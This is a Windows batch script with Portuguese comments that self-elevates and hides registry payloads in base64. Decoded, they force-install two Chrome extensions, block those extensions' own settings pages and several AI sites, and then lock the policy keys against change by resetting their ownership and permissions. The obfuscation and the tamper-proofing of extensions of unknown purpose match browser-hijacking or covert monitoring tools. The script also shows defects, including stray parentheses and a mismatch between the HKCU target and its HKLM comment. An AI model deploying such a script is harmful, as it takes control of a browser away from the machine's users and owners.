@echo off
setlocal enableextensions enabledelayedexpansion

:: Elevate if not running as admin
whoami /groups | find "S-1-16-12288" >nul
if not "%errorlevel%"=="0" (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

set "WORKDIR=%TEMP%\chromepolicytmp_%RANDOM%%RANDOM%"
mkdir "%WORKDIR%" >nul 2>&1

echo Criando pacotes base64...

> "%WORKDIR%\URLBLO.b64" (

  echo //5XAGkAbgBkAG8AdwBzACAAUgBlAGcAaQBzAHQAcgB5ACAARQBkAGkAdABvAHIA
  echo IABWAGUAcgBzAGkAbwBuACAANQAuADAAMAANAAoADQAKAFsASABLAEUAWQBfAEMA
  echo VQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwA
  echo aQBjAGkAZQBzAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAUgBMAEIA
  echo bABvAGMAawBsAGkAcwB0AF0ADQAKACIAMQAiAD0AIgBjAGgAcgBvAG0AZQAtAGUA
  echo eAB0AGUAbgBzAGkAbwBuADoALwAvAGwAbABmAGQAYQBsAGUAawBuAGcAaABlAHAA
  echo bwBmAGoAYwBsAGUAYQBoAGUAbQBnAG4AZABuAGEAZwBoAGgAawAvAGQAYQBzAGgA
  echo YgBvAGEAcgBkAC4AaAB0AG0AbAAgACIADQAKAEAAPQAiACIADQAKACIAMgAiAD0A
  echo IgBwAGUAcgBjAGgAYQBuAGMAZQAuAG8AcgBnACIADQAKACIAMwAiAD0AIgBoAHQA
  echo dABwAHMAOgAvAC8AdgBlAG4AaQBjAGUALgBhAGkALwAiAA0ACgAiADUAIgA9ACIA
  echo YwBoAHIAbwBtAGUALQBlAHgAdABlAG4AcwBpAG8AbgA6AC8ALwBsAGEAawBjAGUA
  echo ZQBkAGYAZgBmAG4AZgBoAGUAYQBpAHAAagBhAGQAYgBjAG4AZABrAGwAZABsAHAA
  echo bABuAGQALwBjAG8AbgBmAGkAZwB1AHIAZQAuAGgAdABtAGwAIgANAAoAIgA2ACIA
  echo PQAiAGgAdAB0AHAAcwA6AC8ALwBoAHUAZwBnAGkAbgBnAGYAYQBjAGUALgBjAG8A
  echo IgANAAoADQAKAA==
)
) 

> "%WORKDIR%\EXTESIONFORCE.b64" (

  echo //5XAGkAbgBkAG8AdwBzACAAUgBlAGcAaQBzAHQAcgB5ACAARQBkAGkAdABvAHIA
  echo IABWAGUAcgBzAGkAbwBuACAANQAuADAAMAANAAoADQAKAFsASABLAEUAWQBfAEMA
  echo VQBSAFIARQBOAFQAXwBVAFMARQBSAFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwA
  echo aQBjAGkAZQBzAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAEUAeAB0AGUA
  echo bgBzAGkAbwBuAEkAbgBzAHQAYQBsAGwARgBvAHIAYwBlAGwAaQBzAHQAXQANAAoA
  echo IgAxACIAPQAiAGwAbABmAGQAYQBsAGUAawBuAGcAaABlAHAAbwBmAGoAYwBsAGUA
  echo YQBoAGUAbQBnAG4AZABuAGEAZwBoAGgAawA7AGgAdAB0AHAAcwA6AC8ALwBjAGwA
  echo aQBlAG4AdABzADIALgBnAG8AbwBnAGwAZQAuAGMAbwBtAC8AcwBlAHIAdgBpAGMA
  echo ZQAvAHUAcABkAGEAdABlADIALwBjAHIAeAAiAA0ACgAiADIAIgA9ACIAbABhAGsA
  echo YwBlAGUAZABmAGYAZgBuAGYAaABlAGEAaQBwAGoAYQBkAGIAYwBuAGQAawBsAGQA
  echo bABwAGwAbgBkADsAaAB0AHQAcABzADoALwAvAGMAbABpAGUAbgB0AHMAMgAuAGcA
  echo bwBvAGcAbABlAC4AYwBvAG0ALwBzAGUAcgB2AGkAYwBlAC8AdQBwAGQAYQB0AGUA
  echo MgAvAGMAcgB4ACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8A
  echo VQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAEcA
  echo bwBvAGcAbABlAFwAQwBoAHIAbwBtAGUAXABFAHgAdABlAG4AcwBpAG8AbgBJAG4A
  echo cwB0AGEAbABsAEYAbwByAGMAZQBsAGkAcwB0AFwATgBvAHYAYQAgAEMAaABhAHYA
  echo ZQAgACMAMQBdAA0ACgANAAoA
)
)

:: Decodifica para .reg
certutil -f -decode "%WORKDIR%\URLBLO.b64" "%WORKDIR%\URLBLO.reg" >nul
if errorlevel 1 goto :error

certutil -f -decode "%WORKDIR%\EXTESIONFORCE.b64" "%WORKDIR%\EXTESIONFORCE.reg" >nul
if errorlevel 1 goto :error

:: Importa no escopo da máquina (HKLM)
reg import "%WORKDIR%\URLBLO.reg" >nul
if errorlevel 1 goto :error
reg import "%WORKDIR%\EXTESIONFORCE.reg" >nul
if errorlevel 1 goto :error

:: Garante chaves alvo
reg add "HKLM\SOFTWARE\Policies" /f >nul
reg add "HKLM\SOFTWARE\Policies\Google" /f >nul
reg add "HKLM\SOFTWARE\Policies\Google\Chrome" /f >nul

:: Cria script PowerShell para ajustar ACLs: somente SYSTEM (Total) e Authenticated Users (Leitura)
> "%WORKDIR%\setacl.ps1" (
  echo param(^)
  echo ^)
  echo $ErrorActionPreference = 'Stop'
  echo function Set-RegAcl(^[string]$keyPath^) {
  echo   if (-not (Test-Path -LiteralPath $keyPath)) { New-Item -Path $keyPath ^| Out-Null }
  echo   $acl = Get-Acl -LiteralPath $keyPath
  echo   # Desabilita heranca e limpa regras
  echo   $acl.SetAccessRuleProtection($true, $false)
  echo   foreach ($ar in $acl.Access) { $acl.RemoveAccessRuleSpecific($ar) ^| Out-Null }
  echo   # SIDs para idioma-independente
  echo   $sysSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-18'  # SYSTEM
  echo   $authSid = New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-11' # Authenticated Users
  echo   $inherit = [System.Security.AccessControl.InheritanceFlags]::ContainerInherit
  echo   $prop = [System.Security.AccessControl.PropagationFlags]::None
  echo   $allow = [System.Security.AccessControl.AccessControlType]::Allow
  echo   $rFull = [System.Security.AccessControl.RegistryRights]::FullControl
  echo   $rRead = [System.Security.AccessControl.RegistryRights]::ReadKey
  echo   $ruleSys  = New-Object System.Security.AccessControl.RegistryAccessRule($sysSid,  $rFull, $inherit, $prop, $allow)
  echo   $ruleAuth = New-Object System.Security.AccessControl.RegistryAccessRule($authSid, $rRead, $inherit, $prop, $allow)
  echo   $acl.AddAccessRule($ruleSys)  ^| Out-Null
  echo   $acl.AddAccessRule($ruleAuth) ^| Out-Null
  echo   # Define owner para SYSTEM
  echo   $acl.SetOwner($sysSid)
  echo   Set-Acl -LiteralPath $keyPath -AclObject $acl
  echo }
  echo Set-RegAcl 'HKLM:\SOFTWARE\Policies'
  echo Set-RegAcl 'HKLM:\SOFTWARE\Policies\Google'
  echo Set-RegAcl 'HKLM:\SOFTWARE\Policies\Google\Chrome'
)

powershell -NoProfile -ExecutionPolicy Bypass -File "%WORKDIR%\setacl.ps1"
if errorlevel 1 goto :error

echo Concluido.
rd /s /q "%WORKDIR%" >nul 2>&1
exit /b 0

:error
echo Falha no processo. Codigo: %errorlevel%
exit /b %errorlevel%
